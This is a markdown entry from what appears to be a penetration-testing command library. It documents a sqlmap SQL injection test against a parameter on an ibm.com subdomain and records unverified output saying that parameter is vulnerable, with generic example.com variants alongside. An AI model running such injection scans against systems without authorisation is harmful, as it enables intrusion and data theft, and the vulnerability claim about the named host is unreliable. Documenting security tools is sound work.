---
id: cmd-uuid-001
data: >-
  sqlmap -u "https://target.ibm.com/access-control/endpoint?client_id=1" --batch
  --level=1 --risk=1
tags:
  - sqli
  - testing
type: command
output: 'Parameter: client_id (GET) is vulnerable. Type: boolean-based blind'
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.386Z'
verified: false
validated: true
submitted: true
---
# sqlmap-test

## Command

```bash
sqlmap -u "https://target.ibm.com/access-control/endpoint?client_id=1" --batch --level=1 --risk=1
```

## Description

This command uses sqlmap to test a URL parameter for SQL injection vulnerabilities at a basic level, automating payload injection and error detection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Target URL with vulnerable parameter | Yes |
| `--batch` | Non-interactive mode | No |
| `--level=1` | Testing intensity (1-5) | No |
| `--risk=1` | Risk level for payloads (1-3) | No |

## Examples

### Basic Usage

```bash
sqlmap -u "https://example.com/page?id=1" --batch
```

### Advanced Usage

```bash
sqlmap -u "https://example.com/page?id=1" --level=3 --risk=2 --dbms=mysql
```

## Expected Output

Vulnerability detection summary, including injection type (e.g., error-based, blind) and injectable parameters.

## Related

- [[Related Procedure|procedures/Exploit-SQL-Injection-in-Client-ID-Parameter]]
